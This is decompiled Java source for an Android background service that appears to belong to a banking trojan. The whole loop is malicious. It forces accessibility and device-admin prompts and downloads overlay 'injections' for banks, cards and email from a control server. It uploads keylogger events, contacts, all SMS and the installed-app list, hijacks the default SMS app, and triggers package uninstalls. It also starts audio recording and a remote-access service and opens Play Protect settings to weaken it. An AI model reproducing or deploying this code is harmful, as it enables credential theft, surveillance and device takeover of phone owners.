package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import com.example.mmm.Utils.*;
import android.content.*;
import android.os.*;
import android.provider.*;
import android.net.*;
import com.example.mmm.Activity.*;
import com.example.mmm.Admin.*;

public class srvWhileWorker extends IntentService
{
    utils ethnic$;
    constants research$;
    
    public srvWhileWorker() {
        super("");
        this.ethnic$ = new utils();
        this.research$ = new constants();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        final utils2 utils2 = new utils2();
        final StringBuilder sb = new StringBuilder();
        sb.append(srvWhileWorker.class.getSimpleName());
        sb.append("  ");
        final String string = sb.toString();
        final String settingsRead = this.ethnic$.SettingsRead((Context)this, "QQ");
        int n = 2000;
        int n2 = 0;
        int n3 = 0;
        int n4 = 0;
        int n5 = 0;
        while (true) {
            if (!utils.isMyServiceRunning((Context)this, srvAccessibility.class) && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                this.startService(new Intent((Context)this, (Class)srvAccessibility.class));
            }
            utils.chalkTile(n);
            final int n6 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AK")) + 2;
            this.ethnic$.SettingsWrite((Context)this, "AK", String.valueOf(n6));
            final utils ethnic$ = this.ethnic$;
            final StringBuilder sb2 = new StringBuilder();
            sb2.append("Tick: ");
            sb2.append(n6);
            ethnic$.Log(string, sb2.toString());
            int n11;
            int n12;
            if (!utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && utils.getScreenBoolean((Context)this)) {
                final int n7 = n3 + 1;
                final int n8 = n4 + 1;
                final int n9 = n7;
                if (Build$VERSION.SDK_INT < 29) {
                    if (this.research$.regional$) {
                        this.startActivity(new Intent((Context)this, (Class)actToaskAccessibility.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                    }
                    else {
                        this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS").addFlags(268435456).addFlags(536870912).addFlags(1073741824));
                    }
                }
                final int n10 = 2000;
                n11 = n2;
                n3 = n9;
                n4 = n8;
                n12 = n10;
            }
            else {
                n11 = n2 + 1;
                n12 = 20000;
            }
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && "xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && !this.ethnic$.SettingsRead((Context)this, "XB").equals("1")) {
                this.ethnic$._tattoo((Context)this, this.ethnic$.getLabelApplication((Context)this), this.ethnic$._painful(), "main");
            }
            final int n13 = n11;
            final int n14 = n3;
            final int n15 = n4;
            final int n16 = n12;
            final int n17 = n13;
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && Build$VERSION.SDK_INT >= 29 && utils.getMiuiVersion() < 10) {
                this.ethnic$._chapel((Context)this);
            }
            final String settingsRead2 = this.ethnic$.SettingsRead((Context)this, "XS");
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer((Context)this) && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "XB").equals("1") && !settingsRead2.equals("1") && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                utils2._fires((Context)this);
                this.ethnic$.Log(string, "Open Activity AutoStartManagement");
            }
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10 && utils._prayer((Context)this) && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "XB").equals("1") && settingsRead2.equals("1") && !this.ethnic$.SettingsRead((Context)this, "XH").equals("1") && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                utils2._tulsa((Context)this);
                this.ethnic$.Log(string, "Open Activity isXiaomiHiddenappsconfigactivity");
            }
            if (utils._exercise((Context)this) && !utils.isMyServiceRunning((Context)this, srvLockDevice.class) && this.ethnic$.SettingsRead((Context)this, "AZ").equals("1")) {
                this.startService(new Intent((Context)this, (Class)srvLockDevice.class));
            }
            if (utils.hasPermission((Context)this, this.research$.pentium$[2]).equals("1")) {
                if (this.ethnic$.SettingsRead((Context)this, "WR").equals("1") && !utils.isMyServiceRunning((Context)this, srvRecordAudio.class) && !this.ethnic$.SettingsRead((Context)this, "SS").equals("start")) {
                    this.startService(new Intent((Context)this, (Class)srvRecordAudio.class).putExtra("tick", "-1").putExtra("name", "record_audio"));
                }
                final String settingsRead3 = this.ethnic$.SettingsRead((Context)this, "FF");
                if (settingsRead3.contains("###")) {
                    this.ethnic$._pasta((Context)this, settingsRead3);
                }
            }
            if (this.ethnic$.SettingsRead((Context)this, "QO").equals("1")) {
                this.ethnic$.Log(string, "Start Downloading Injections...");
                final String[] split = this.ethnic$.SettingsRead((Context)this, "QU").split(":");
                int i = 0;
                int n18 = 0;
                while (i < split.length) {
                    final utils ethnic$2 = this.ethnic$;
                    final StringBuilder sb3 = new StringBuilder();
                    sb3.append("Name Inject: ");
                    sb3.append(split[i]);
                    ethnic$2.Log(string, sb3.toString());
                    int n19 = n18;
                    if (!split[i].isEmpty()) {
                        final boolean equals = split[i].equals("device_null#");
                        n19 = n18;
                        if (!equals) {
                            n19 = n18;
                            if (this.ethnic$.SettingsRead((Context)this, split[i]).isEmpty()) {
                                final String plates = this.ethnic$._plates((Context)this, split[i], "q=d_attacker&ws=");
                                if (plates.length() > 10) {
                                    this.ethnic$.SettingsWrite((Context)this, split[i], plates);
                                    final utils ethnic$3 = this.ethnic$;
                                    final StringBuilder sb4 = new StringBuilder();
                                    sb4.append("Downloading Injection:  ");
                                    sb4.append(split[i]);
                                    sb4.append("   size: ");
                                    sb4.append(plates.length());
                                    ethnic$3.Log(string, sb4.toString());
                                }
                                else {
                                    final utils ethnic$4 = this.ethnic$;
                                    final StringBuilder sb5 = new StringBuilder();
                                    sb5.append("Downloading Injection Error:  ");
                                    sb5.append(split[i]);
                                    sb5.append("   size: ");
                                    sb5.append(plates.length());
                                    ethnic$4.Log(string, sb5.toString());
                                    ++n18;
                                }
                                final String tests = this.ethnic$._tests((Context)this, split[i], "q=d_attacker_two&ws=");
                                n19 = n18;
                                if (tests.length() > 10) {
                                    final utils ethnic$5 = this.ethnic$;
                                    final StringBuilder sb6 = new StringBuilder();
                                    sb6.append("icon_");
                                    sb6.append(split[i]);
                                    ethnic$5.SettingsWrite((Context)this, sb6.toString(), tests);
                                    final utils ethnic$6 = this.ethnic$;
                                    final StringBuilder sb7 = new StringBuilder();
                                    sb7.append("Downloading Icon:  ");
                                    sb7.append(split[i]);
                                    sb7.append("   size: ");
                                    sb7.append(tests.length());
                                    ethnic$6.Log(string, sb7.toString());
                                    n19 = n18;
                                }
                            }
                        }
                    }
                    ++i;
                    n18 = n19;
                }
                this.ethnic$.SettingsWrite((Context)this, "QO", "");
                this.ethnic$.Log(string, "Downloading All Injections! =)");
                System.gc();
            }
            final String settingsRead4 = this.ethnic$.SettingsRead((Context)this, "AA");
            if (!settingsRead4.isEmpty()) {
                final String[] split2 = settingsRead4.split(":");
                for (int j = 0; j < split2.length; ++j) {
                    if (!split2[j].isEmpty()) {
                        final utils ethnic$7 = this.ethnic$;
                        final StringBuilder sb8 = new StringBuilder();
                        sb8.append("Send Data Injection to Server: ");
                        sb8.append(split2[j]);
                        ethnic$7.Log(string, sb8.toString());
                        final String settingsRead5 = this.ethnic$.SettingsRead((Context)this, split2[j]);
                        final utils ethnic$8 = this.ethnic$;
                        final StringBuilder sb9 = new StringBuilder();
                        sb9.append("RESPENCE ");
                        sb9.append(settingsRead5);
                        ethnic$8.Log(string, sb9.toString());
                        final utils ethnic$9 = this.ethnic$;
                        final String s = split2[j];
                        final String s2 = "q=saved_data_attacker&ws=";
                        final int n20 = j;
                        if (ethnic$9._decrease((Context)this, s, settingsRead5, settingsRead, s2).equals("ok")) {
                            final utils ethnic$10 = this.ethnic$;
                            final StringBuilder sb10 = new StringBuilder();
                            sb10.append("RESPONCE (ok) ");
                            sb10.append(split2[n20]);
                            ethnic$10.Log(string, sb10.toString());
                            final utils ethnic$11 = this.ethnic$;
                            final String s3 = "AA";
                            final StringBuilder sb11 = new StringBuilder();
                            sb11.append(split2[n20]);
                            sb11.append(":");
                            ethnic$11._founded((Context)this, s3, sb11.toString());
                        }
                    }
                }
            }
            this.ethnic$._compiled((Context)this, settingsRead);
            final utils ethnic$12 = this.ethnic$;
            final String settingsRead6 = ethnic$12.SettingsRead((Context)this, "AM");
            if (!settingsRead6.isEmpty() && ethnic$12.sendKeyloggerLogs((Context)this, settingsRead6, settingsRead, "q=saved_accessibility_events&ws=").equals("ok")) {
                ethnic$12.SettingsWrite((Context)this, "AM", "");
            }
            final utils ethnic$13 = this.ethnic$;
            final String settingsRead7 = ethnic$13.SettingsRead((Context)this, "SX");
            if (!settingsRead7.isEmpty() && ethnic$13._servers((Context)this, settingsRead7, settingsRead, "q=saved_contacts&ws=").equals("ok")) {
                ethnic$13.SettingsWrite((Context)this, "SX", "");
            }
            final String settingsRead8 = ethnic$13.SettingsRead((Context)this, "SV");
            if (!settingsRead8.isEmpty() && ethnic$13._scott((Context)this, settingsRead8, settingsRead, "q=saved_all_sms&ws=").equals("ok")) {
                ethnic$13.SettingsWrite((Context)this, "SV", "");
            }
            final String settingsRead9 = ethnic$13.SettingsRead((Context)this, "SC");
            if (!settingsRead9.isEmpty() && ethnic$13.sendSavedSms((Context)this, settingsRead9, settingsRead, "q=saved_applications&ws=").equals("ok")) {
                ethnic$13.SettingsWrite((Context)this, "SC", "");
            }
            if (utils.getScreenBoolean((Context)this) && Build$VERSION.SDK_INT >= 19) {
                if (!this.ethnic$.SettingsRead((Context)this, "AF").equals("1") && (!this.ethnic$.SettingsRead((Context)this, "SN").equals("1") || Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SM")) < 10)) {
                    if (Telephony$Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName()) && Build$VERSION.SDK_INT < 29) {
                        this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                        utils.swapSmsManager((Context)this, this.ethnic$.SettingsRead((Context)this, "AD"));
                    }
                }
                else if (!Telephony$Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName())) {
                    if (Build$VERSION.SDK_INT >= 29) {
                        this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                        this.startActivity(new Intent((Context)this, (Class)Class.forName(activity_change_sms_manager_sdk_Q.class.getName())).addFlags(268435456));
                    }
                    else {
                        this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                        utils.swapSmsManager((Context)this, this.getPackageName());
                    }
                }
                if (Telephony$Sms.getDefaultSmsPackage((Context)this).equals(this.getPackageName()) && this.ethnic$.SettingsRead((Context)this, "SN").equals("1")) {
                    this.ethnic$.SettingsWrite((Context)this, "SN", "");
                }
            }
            if (this.ethnic$.SettingsRead((Context)this, "AX").equals("1")) {
                utils._pensions((Context)this);
            }
            if (utils.getScreenBoolean((Context)this)) {
                final String settingsRead10 = this.ethnic$.SettingsRead((Context)this, "QR");
                if (!settingsRead10.isEmpty()) {
                    this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                    final Intent \u0131ntent2 = new Intent("android.intent.action.DELETE");
                    \u0131ntent2.setData(Uri.parse("package:".concat(String.valueOf(settingsRead10))));
                    this.startActivity(\u0131ntent2);
                }
            }
            if (!this.ethnic$.SettingsRead((Context)this, "QU").isEmpty()) {
                final int \u0131nt = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AV"));
                if (n6 > \u0131nt && \u0131nt != -1 && \u0131nt != -2 && this.ethnic$._atlantic((Context)this, "run_injects_banks", settingsRead, "q=pause_attacker&ws=").equals("on_inject_banks")) {
                    this.ethnic$.SettingsWrite((Context)this, "AV", "-2");
                }
                final int \u0131nt2 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AB"));
                if (n6 > \u0131nt2 && \u0131nt2 != -1 && \u0131nt2 != -2 && this.ethnic$._atlantic((Context)this, "run_injects_cards", settingsRead, "q=pause_attacker&ws=").equals("on_inject_cards")) {
                    this.ethnic$.SettingsWrite((Context)this, "AB", "-2");
                }
                final int \u0131nt3 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "AN"));
                if (n6 > \u0131nt3 && \u0131nt3 != -1 && \u0131nt3 != -2 && this.ethnic$._atlantic((Context)this, "run_injects_emails", settingsRead, "q=pause_attacker&ws=").equals("on_inject_emails")) {
                    this.ethnic$.SettingsWrite((Context)this, "AN", "-2");
                }
            }
            if (!utils.isMyServiceRunning((Context)this, srvRAT.class) && this.ethnic$.SettingsRead((Context)this, "RQ").equals("connect")) {
                this.startService(new Intent((Context)this, (Class)srvRAT.class));
            }
            final int \u0131nt4 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SI"));
            if (\u0131nt4 > 0 && n6 > \u0131nt4 && utils.getScreenBoolean((Context)this) && !this.ethnic$.hasPermissionAllTrue((Context)this) && this.ethnic$.SettingsRead((Context)this, "SN").isEmpty()) {
                this.startActivity(new Intent((Context)this, (Class)actPermissions.class).addFlags(268435456));
            }
            final int \u0131nt5 = Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SU"));
            if (\u0131nt5 > 0 && n6 > \u0131nt5 && !utils._exercise((Context)this) && utils.getScreenBoolean((Context)this) && utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                    this.ethnic$.SettingsWrite((Context)this, "SQ", "1");
                    this.ethnic$.Log(string, "autoClick=1 ADMIN DEVICE");
                }
                final Intent \u0131ntent3 = new Intent((Context)this, (Class)ActivityAdmin.class);
                \u0131ntent3.putExtra("admin", "1");
                \u0131ntent3.addFlags(268435456);
                \u0131ntent3.addFlags(536870912);
                this.startActivity(\u0131ntent3);
            }
            final int n21 = n5 + 1;
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class) && this.research$.fault$ && utils.getScreenBoolean((Context)this) && this.ethnic$.SettingsRead((Context)this, "SR").equals("1") && n6 > Integer.parseInt(this.ethnic$.SettingsRead((Context)this, "SY"))) {
                if (Build$VERSION.SDK_INT >= 25) {
                    this.ethnic$.SettingsWrite((Context)this, "ST", "1");
                    final Intent \u0131ntent4 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                    \u0131ntent4.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                    \u0131ntent4.addFlags(268435456);
                    \u0131ntent4.addFlags(8388608);
                    this.startActivity(\u0131ntent4);
                }
                else {
                    this.ethnic$.SettingsWrite((Context)this, "ST", "1");
                    final Intent \u0131ntent5 = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                    \u0131ntent5.setClassName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
                    \u0131ntent5.addFlags(268435456);
                    \u0131ntent5.addFlags(8388608);
                    this.startActivity(\u0131ntent5);
                }
            }
            final int n22 = n15;
            n2 = n17;
            n = n16;
            n3 = n14;
            n4 = n22;
            n5 = n21;
        }
    }
}
